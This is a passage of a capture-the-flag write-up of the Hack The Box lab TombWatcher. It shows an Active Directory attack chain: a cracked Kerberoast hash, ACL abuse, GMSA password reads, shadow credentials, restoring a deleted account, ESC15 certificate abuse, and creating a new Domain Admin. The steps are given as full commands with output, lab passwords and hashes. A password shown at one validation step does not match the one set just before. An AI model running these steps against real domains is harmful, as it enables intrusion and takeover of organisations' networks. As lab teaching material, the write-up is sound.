e5d71367f0c80e9166d43fe2a4a8f3e515fcd8afeb6959293502baebc088ac9f17158084c289aa2e1449967db1354ea92cd952ebe5e936b1f9738e852c25ece397f200caff3201ce5af53b08885658b6a47261a9819f5fe1a97347b7ec6f8412cee8adddfb6e7821cd08a51fe6bc8e2bc0407cef0e2233680afc2c3b854f5cf0f35889710141e1f6b7f0027670102d50582baae536253d936dd2c5ed64800c7b96f70175af2ec30ed9ffa669e45d3e31c8c2da97d4cfcd7b9c0cd4443b114439b9bec5f71b878da9544200828e124badbf2adc91ca114f852bd7c75b3119f033060cfd1b39516aa3cbbacfcc012b50db7aee32f5e54a793c48b642190b5ac3069898d88262dcec395fbc886e6657fc8ea7dba91dbf0c4ef4e430dd2d339b678bb9df267adba98bddec83710feef3bee7e9009bbb4b29ee5dd0c0aa8331ce8c72995711db19065a2de40ba258e25b517f4eb29166a8380aba98aa00690211ac7b4d759f6e74aa229eee7c4c7bddfe36f5b399053fd442ad9055ada6175d4d96d39becd9158d7f29f692bb047e0e7dddae0812fc6
```

![](https://cdn-images-1.medium.com/max/1200/1*8m_YNDQENyy6aQ3lIethBA.png)

*I used New hashcat 7 to crack this hash*

Now we can validate these credentials using `nxc`.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb dc01.tombwatcher.htb -u alfred -p basketball  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\alfred:basketball  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc winrm dc01.tombwatcher.htb -u alfred -p basketball  
WINRM 10.10.11.72 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)  
WINRM 10.10.11.72 5985 DC01 [-] tombwatcher.htb\alfred:basketball
```

![](https://cdn-images-1.medium.com/max/800/1*Cy_t3xxDUkbJUq_Gc3MAsw.png)

*Our Credlogger #2*

> In a real pentesting engagement we’re usually asked to perform cleanup afterward so to undo the Kerberoast change we’ll remove the SPN using BloodyAD .

```bash
bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName
```

![](https://cdn-images-1.medium.com/max/1200/1*1e37oFVXtoRsNbNu0U-kNA.png)

*Alfred -> Ansible_dev$*

2. Add the compromised account(***Alfred***) to **Infrastructure Group**.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember Infrastructure alfred  
[+] alfred added to Infrastructure
```

3.Now we can ReadGMSAPasswrod for `ansible_dev$`

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa  
LDAP 10.10.11.72 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.72 389 DC01 [+] tombwatcher.htb\alfred:basketball  
LDAP 10.10.11.72 389 DC01 [*] Getting GMSA Passwords  
LDAP 10.10.11.72 389 DC01 Account: ansible_dev$
```

Now we validate the `ANSIBLE_DEV$` credentials by nxc

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# netexec smb DC01.tombwatcher.htb -u 'ANSIBLE_DEV$' -H bf8b11e301f7ba3fdc616e5d4fa01c30  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\ANSIBLE_DEV$:bf8b11e301f7ba3fdc616e5d4fa01c30
```

![](https://cdn-images-1.medium.com/max/800/1*KxCdCLYACuWoyJUMOZXHkQ.png)

*Our Credlogger #3*

![](https://cdn-images-1.medium.com/max/800/1*V1OhRrlrD75CtuTtDRcYkQ.png)

*ANSIBLE_DEV$ -> Sam*

4. Use GMSA access(***ANSIBLE_DEV$)*** to get **ForceChangePassword** on `SAM` and set a new password.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':bf8b11e301f7ba3fdc616e5d4fa01c30' --host dc01.tombwatcher.htb set password "sam" 'Mav##321!!LLMOMO'  
[+] Password changed successfully!
```

Now we validate the **sam **credentials by nxc

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb DC01.tombwatcher.htb -u sam -p 'Mav##321!!LLMOMO'  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\sam:Maverick31234
```

![](https://cdn-images-1.medium.com/max/800/1*oVBpXvSQjzYZVBa3xx8N0g.png)

*Our Credlogger #4*

![](https://cdn-images-1.medium.com/max/800/1*SUs3v6VSnudb_wB0xjbydw.png)

*Sam -> John*

Now we’re the `SAM` account and we have **WriteOwner** on `john`. That means we can make `SAM` the owner of `john`, and as owner we can grant **GenericAll**, which effectively lets us do anything typically change the password, create shadow credentials, or target Kerberoasting.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# bloodyAD -d tombwatcher.htb -u sam -p 'Mav##321!!LLMOMO' --host dc01.tombwatcher.htb set owner john sam  
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# bloodyAD -d tombwatcher.htb -u sam -p 'Mav##321!!LLMOMO' --host dc01.tombwatcher.htb add genericAll john sam  
[+] sam has now GenericAll on john
```

After setting `SAM` as the owner of `john` and granting `GenericAll`, it’s time to create shadow credentials With `Certipy`

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# sudo ntpdate 10.10.11.72|certipy shadow auto -target DC01.tombwatcher.htb -u sam -p 'Mav##321!!LLMOMO' -account john  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.  
[!] Use -debug to print a stacktrace  
[*] Targeting user 'john'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID 'fdfee43c-3e7a-5127-db70-cd96730d844d'  
[*] Adding Key Credential with device ID 'fdfee43c-3e7a-5127-db70-cd96730d844d' to the Key Credentials for 'john'  
[*] Successfully added Key Credential with device ID 'fdfee43c-3e7a-5127-db70-cd96730d844d' to the Key Credentials for 'john'  
[*] Authenticating as 'john' with the certificate  
[*] Certificate identities:  
[*] No identities found in this certificate  
[*] Using principal: 'john@tombwatcher.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'john.ccache'  
[*] Wrote credential cache to 'john.ccache'  
[*] Trying to retrieve NT hash for 'john'  
[*] Restoring the old Key Credentials for 'john'  
[*] Successfully restored the old Key Credentials for 'john'  
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```

![](https://cdn-images-1.medium.com/max/800/1*v4bZ9ObOf0xl0Pl7tkWyLA.png)

*Credlogger #5*

Now we can check if the `SAM` credentials are valid using `nxc`.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc smb dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# nxc winrm dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf  
WINRM 10.10.11.72 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)  
WINRM 10.10.11.72 5985 DC01 [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf (Pwn3d!)
```

And hell yeah now we have winrm session

<div class="video-embed"><iframe src="https://www.youtube.com/embed/z8thoG7gPd0" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

> Make sure to watch this awesome talk about DACLs if you’re not familiar with them they’re basically the nerve system of Active Directory.

![](https://cdn-images-1.medium.com/max/800/0*XnCWQPZ_yw0yGv5o.gif)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# evil-winrm -i DC01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf  
  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\john\Documents>
```

Now it’s time for privilege escalation. In a real engagement you should do some manual enumeration first and also run tools like `winPEAS` and other Windows [privesc checks](https://github.com/itm4n/PrivescCheck). One of the most important things to enumerate is AD CS vulnerabilities, so I’ll use `certipy` here.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# certipy find -target dc01.tombwatcher.htb -u john -hashes :ad9324754583e3e42b55aad4d3b8d2bf  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.  
[!] Use -debug to print a stacktrace  
[*] Finding certificate templates  
[*] Found 33 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 11 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 13 issuance policies  
[*] Found 0 OIDs linked to templates  
[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.  
[!] Use -debug to print a stacktrace  
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'  
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'  
[*] Saving text output to '20251016154524_Certipy.txt'  
[*] Wrote text output to '20251016154524_Certipy.txt'  
[*] Saving JSON output to '20251016154524_Certipy.json'  
[*] Wrote JSON output to '20251016154524_Certipy.json'
```

When I read the Certipy output there was nothing interesting — even when I uploaded[* Certify 2.0*](https://github.com/GhostPack/Certify), nothing useful showed up either.

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> ./Certify.exe enum-templates --filter-vulnerable  
  
_____ _ _ __  
/ ____| | | (_)/ _|  
| | ___ _ __| |_ _| |_ _ _  
| | / _ \ '__| __| | _| | | |  
| |___| __/ | | |_| | | | |_| |  
\_____\___|_| \__|_|_| \__, |  
__/ |  
|___./  
v2.0.0  
  
[*] Action: Find certificate templates  
[*] Using the search base 'CN=Configuration,DC=tombwatcher,DC=htb'  
[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.  
[X] AuthWithChannelBinding HTTP request for URL 'https://DC01.tombwatcher.htb/certsrv/' failed with error: An error occurred while sending the request.  
  
[*] Listing info about the enterprise certificate authority 'tombwatcher-CA-1'  
  
Enterprise CA Name : tombwatcher-CA-1  
DNS Hostname : DC01.tombwatcher.htb  
FullName : DC01.tombwatcher.htb\tombwatcher-CA-1  
Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED  
Cert SubjectName : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb  
Cert Thumbprint : 0DA6E224A292E2C8782B1587F446857BB7C324C3  
Cert Serial : 3428A7FC52C310B2460F8440AA8327AC  
Cert Start Date : 11/15/2024 7:47:48 PM  
Cert End Date : 11/15/2123 7:57:48 PM  
Cert Chain : CN=tombwatcher-CA-1,DC=tombwatcher,DC=htb  
User Specifies SAN : Disabled  
RPC Request Encryption : Enabled  
CA Permissions  
Owner: BUILTIN\Administrators S-1-5-32-544  
  
Access Rights Principal  
Allow Enroll NT AUTHORITY\Authenticated Users S-1-5-11  
Allow ManageCA, ManageCertificates BUILTIN\Administrators S-1-5-32-544  
Allow ManageCA, ManageCertificates TOMBWATCHER\Domain Admins S-1-5-21-1392491010-1358638721-2126982587-512  
Allow ManageCA, ManageCertificates TOMBWATCHER\Enterprise Admins S-1-5-21-1392491010-1358638721-2126982587-519  
Enrollment Agent Restrictions : None  
  
[+] No certificates templates found with the current filter parameters.  
  
Certify completed in 00:00:12.8341575  
*Evil-WinRM* PS C:\Users\john\Documents>
```

So, I know this might be quite new to you — I think it’s actually my first time showing this AD feature. It’s the [**Active Directory Recycle Bin**](https://netwrix.com/en/resources/blog/active-directory-object-recovery-recycle-bin/), which allows you to recover deleted AD objects without restoring them from a backup. Let’s check it out!

**First let’s see if this feaute is enabling here or not**

```powershell
*Evil-WinRM* PS C:\> Get-ADOptionalFeature 'Recycle Bin Feature'  
  
  
DistinguishedName : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=tombwatcher,DC=htb  
EnabledScopes : {CN=Partitions,CN=Configuration,DC=tombwatcher,DC=htb, CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb}  
FeatureGUID : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a  
FeatureScope : {ForestOrConfigurationSet}  
IsDisableable : False  
Name : Recycle Bin Feature  
ObjectClass : msDS-OptionalFeature  
ObjectGUID : 907469ef-52c5-41ab-ad19-5fdec9e45082  
RequiredDomainMode :  
RequiredForestMode : Windows2008R2Forest
```

Next, let’s see what’s inside it meaning which objects have been deleted.

```powershell
*Evil-WinRM* PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent  
  
  
Deleted : True  
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb  
LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb  
Name : cert_admin  
DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3  
ObjectClass : user  
ObjectGUID : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3  
objectSid : S-1-5-21-1392491010-1358638721-2126982587-1109  
  
Deleted : True  
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb  
LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb  
Name : cert_admin  
DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358  
ObjectClass : user  
ObjectGUID : c1f1f0fe-df9c-494c-bf05-0679e181b358  
objectSid : S-1-5-21-1392491010-1358638721-2126982587-1110  
  
Deleted : True  
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb  
LastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb  
Name : cert_admin  
DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
ObjectClass : user  
ObjectGUID : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
objectSid : S-1-5-21-1392491010-1358638721-2126982587-1111  
  
  
  
*Evil-WinRM* PS C:\>
```

Now we know that the **cer_admin** user was deleted and it looks like this account was one of the admins over AD CS. Since we’re **John** and we have **GenericAll**, we can basically do whatever we want. So, I’ll restore this user, set a new password for them, and then run **Certipy** again using their permissions to see what we’ve got.

```powershell
*Evil-WinRM* PS C:\> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
*Evil-WinRM* PS C:\> Get-ADUser cert_admin  
  
  
DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb  
Enabled : True  
GivenName : cert_admin  
Name : cert_admin  
ObjectClass : user  
ObjectGUID : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
SamAccountName : cert_admin  
SID : S-1-5-21-1392491010-1358638721-2126982587-1111  
Surname : cert_admin  
UserPrincipalName :
```

> Now it’s time to set a new password for this user.

```c
*Evil-WinRM* PS C:\> Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'Maveric#!$!$!!' -AsPlainText -Force)  
*Evil-WinRM* PS C:\> 
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# netexec smb dc01.tombwatcher.htb -u cert_admin -p 'Maveric#!$!$!!'  
SMB 10.10.11.72 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.72 445 DC01 [+] tombwatcher.htb\cert_admin:Maveric#!$!$!!
```

Now it’s a good time to run **Certipy** again, this time with the **cer_admin** user’s privileges.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'Maveric#!$!$!!' -vulnerable -stdout  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.  
[!] Use -debug to print a stacktrace  
[*] Finding certificate templates  
[*] Found 33 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 11 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 13 issuance policies  
[*] Found 0 OIDs linked to templates  
[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.  
[!] Use -debug to print a stacktrace  
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP  
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'  
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : tombwatcher-CA-1  
DNS Name : DC01.tombwatcher.htb  
Certificate Subject : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb  
Certificate Serial Number : 3428A7FC52C310B2460F8440AA8327AC  
Certificate Validity Start : 2024-11-16 00:47:48+00:00  
Certificate Validity End : 2123-11-16 00:57:48+00:00  
Web Enrollment  
HTTP  
Enabled : False  
HTTPS  
Enabled : False  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Active Policy : CertificateAuthority_MicrosoftDefault.Policy  
Permissions  
Owner : TOMBWATCHER.HTB\Administrators  
Access Rights  
ManageCa : TOMBWATCHER.HTB\Administrators  
TOMBWATCHER.HTB\Domain Admins  
TOMBWATCHER.HTB\Enterprise Admins  
ManageCertificates : TOMBWATCHER.HTB\Administrators  
TOMBWATCHER.HTB\Domain Admins  
TOMBWATCHER.HTB\Enterprise Admins  
Enroll : TOMBWATCHER.HTB\Authenticated Users  
Certificate Templates  
0  
Template Name : WebServer  
Display Name : Web Server  
Certificate Authorities : tombwatcher-CA-1  
Enabled : True  
Client Authentication : False  
Enrollment Agent : False  
Any Purpose : False  
Enrollee Supplies Subject : True  
Certificate Name Flag : EnrolleeSuppliesSubject  
Extended Key Usage : Server Authentication  
Requires Manager Approval : False  
Requires Key Archival : False  
Authorized Signatures Required : 0  
Schema Version : 1  
Validity Period : 2 years  
Renewal Period : 6 weeks  
Minimum RSA Key Length : 2048  
Template Created : 2024-11-16T00:57:49+00:00  
Template Last Modified : 2024-11-16T17:07:26+00:00  
Permissions  
Enrollment Permissions  
Enrollment Rights : TOMBWATCHER.HTB\Domain Admins  
TOMBWATCHER.HTB\Enterprise Admins  
TOMBWATCHER.HTB\cert_admin  
Object Control Permissions  
Owner : TOMBWATCHER.HTB\Enterprise Admins  
Full Control Principals : TOMBWATCHER.HTB\Domain Admins  
TOMBWATCHER.HTB\Enterprise Admins  
Write Owner Principals : TOMBWATCHER.HTB\Domain Admins  
TOMBWATCHER.HTB\Enterprise Admins  
Write Dacl Principals : TOMBWATCHER.HTB\Domain Admins  
TOMBWATCHER.HTB\Enterprise Admins  
Write Property Enroll : TOMBWATCHER.HTB\Domain Admins  
TOMBWATCHER.HTB\Enterprise Admins  
TOMBWATCHER.HTB\cert_admin  
[+] User Enrollable Principals : TOMBWATCHER.HTB\cert_admin  
[!] Vulnerabilities  
ESC15 : Enrollee supplies subject and schema version is 1.  
[*] Remarks  
ESC15 : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Here we go Here we go it’s There is [ESC15 ](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)Here

> The ESC15 (also known as “EKUwu”, tracked as CVE‑2024‑49019) vulnerability targets misconfigured certificate templates within Active Directory Certificate Services (AD CS). Specifically, when a template uses schema version 1 and allows the “Supply in the request” option, an attacker with even low-level enrollment rights can craft a certificate signing request (CSR) that overrides the intended Extended Key Usage (EKU) or application policy. This allows them to obtain a certificate that impersonates high-privileged accounts potentially leading to full domain compromise. It’s a stealthy yet critical risk because many organizations overlook the enrollment rights and template configuration of internal PKI systems

> Bonus: at this stage you can run the BloodHound ingester again it’s useful for seeing certificate templates and AD relationships in more detail after we gain the cert_admin account. When I wrote this write-up I pulled the outputs from my Obsidian vault (this lab run was already finished), so consider this a bonus step you can run live to expand your visibility and confirm the AD CS template state.

As usual, we’ll request a certificate and authenticate against AD CS using `certipy`.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# certipy req -u cert_admin -p 'Maveric#!$!$!!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher  
-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 4  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator@tombwatcher.htb'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx' 
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*] SAN UPN: 'administrator@tombwatcher.htb'  
[*] Using principal: 'administrator@tombwatcher.htb'  
[*] Trying to get TGT...  
[-] Certificate is not valid for client authentication  
[-] Check the certificate template and ensure it has the correct EKU(s)  
[-] If you recently changed the certificate template, wait a few minutes for the change to propagate  
[-] See the wiki for more information
```

![](https://cdn-images-1.medium.com/max/1200/1*6uhknzlkPxAOBzFSQci9OA.png)

*amm may be i can get ldap-shell ??*

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*] SAN UPN: 'administrator@tombwatcher.htb'  
[*] Connecting to 'ldaps://10.10.11.72:636'  
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'  
Type help for list of commands  
  
# help  
  
add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If no  
spns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.  
rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.  
add_user new_user [parent] - Creates a new user.  
add_user_to_group user group - Adds a user to a group.  
change_password user [password] - Attempt to change a given user's password. Requires LDAPS.  
clear_rbcd target - Clear the resource based constrained delegation configuration information.  
disable_account user - Disable the user's account.  
enable_account user - Enable the user's account.  
dump - Dumps the domain.  
search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.  
get_user_groups user - Retrieves all groups this user is a member of.  
get_group_users group - Retrieves all members of a group.  
get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).  
grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMA  
ccountName).  
set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.  
set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccou  
ntName).  
start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operat  
ions necessitating an encrypted channel.  
write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered  
surrounding by {}.  
whoami - get connected user  
dirsync - Dirsync requested attributes  
exit - Terminates this session.  
  
# exit
```

Good I got an LDAP shell. There’s a lot I can do (Certipy’s help menu shows many options), but I’ll just reset the **Administrator** password for now. Alternatively, you could create a new user, add it to **Domain Admins**, and log in that’s usually less noisy than changing the built-in Administrator account. damn i will chose second option causte it’s better in pentest

```bash
# add_user attacker  
Attempting to create user in: %s CN=Users,DC=tombwatcher,DC=htb  
Adding new user with username: attacker and password: "?1"im\E~R}*1yz result: OK  
  
# change_password attacker P@ssw0rd123!  
Got User DN: CN=attacker,CN=Users,DC=tombwatcher,DC=htb  
Attempting to set new password of: P@ssw0rd123!  
Password changed successfully!  
  
# add_user_to_group attacker "Domain Admins"  
Adding user: attacker to group Domain Admins result: OK  
  
#
```

```powershell
┌──(root㉿kali)-[/home/kali/Desktop/htb/TombWatch]  
└─# evil-winrm -i 10.10.11.72 -u attacker -p 'P@ssw0rd123!'  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\attacker\Documents> ls  
*Evil-WinRM* PS C:\Users\attacker\Documents> cd ../../../  
*Evil-WinRM* PS C:\> cd users\  
*Evil-WinRM* PS C:\users> ls  
  
  
Directory: C:\users  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d----- 11/15/2024 7:57 PM .NET v4.5  
d----- 11/15/2024 7:57 PM .NET v4.5 Classic  
d----- 12/11/2024 5:38 PM Administrator  
d----- 10/18/2025 6:51 AM attacker  
d----- 12/11/2024 6:42 PM john  
d-r--- 11/15/2024 6:52 PM Public  
  
  
*Evil-WinRM* PS C:\users> cd Administrator  
*Evil-WinRM* PS C:\users\Administrator> ls  
  
  
Directory: C:\users\Administrator  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d-r--- 6/4/2025 6:38 PM 3D Objects  
d-r--- 6/4/2025 6:38 PM Contacts  
d-r--- 6/4/2025 6:38 PM Desktop  
d-r--- 6/4/2025 6:38 PM Documents  
d-r--- 6/4/2025 6:38 PM Downloads  
d-r--- 6/4/2025 6:38 PM Favorites  
d-r--- 6/4/2025 6:38 PM Links  
d-r--- 6/4/2025 6:38 PM Music  
d-r--- 6/4/2025 6:38 PM Pictures  
d-r--- 6/4/2025 6:38 PM Saved Games  
d-r--- 6/4/2025 6:38 PM Searches  
d-r--- 6/4/2025 6:38 PM Videos  
  
  
*Evil-WinRM* PS C:\users\Administrator> cd desktop  
*Evil-WinRM* PS C:\users\Administrator\desktop> ls  
  
  
Directory: C:\users\Administrator\desktop  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
-ar--- 10/18/2025 5:52 AM 34 root.txt
```

---

#### 📢References

> 🔗 [https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760](https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760)

> 🔗 [https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)

> 🔗 [https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#esc15---ekuwu-application-policy-injection](https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#esc15---ekuwu-application-policy-injection)

---

I think I’ve covered most AD CS escalation paths in my write-ups this is probably the last AD CS escalation I’ll include for now. I’ll publish more write-ups about web attacks soon: one on JWT attacks and another on GraphQL vulnerabilities. I’ll post them here and on Twitter and LinkedIn, so make sure to follow me. Checkmate bruhhhh.

![](https://cdn-images-1.medium.com/max/800/0*WW72BpdCWl01da3G.gif)

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*iApth9ilpe7HjWd0.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking!

By Mohamed Eletreby on October 19, 2025.

Canonical link

Exported from Medium on April 20, 2026.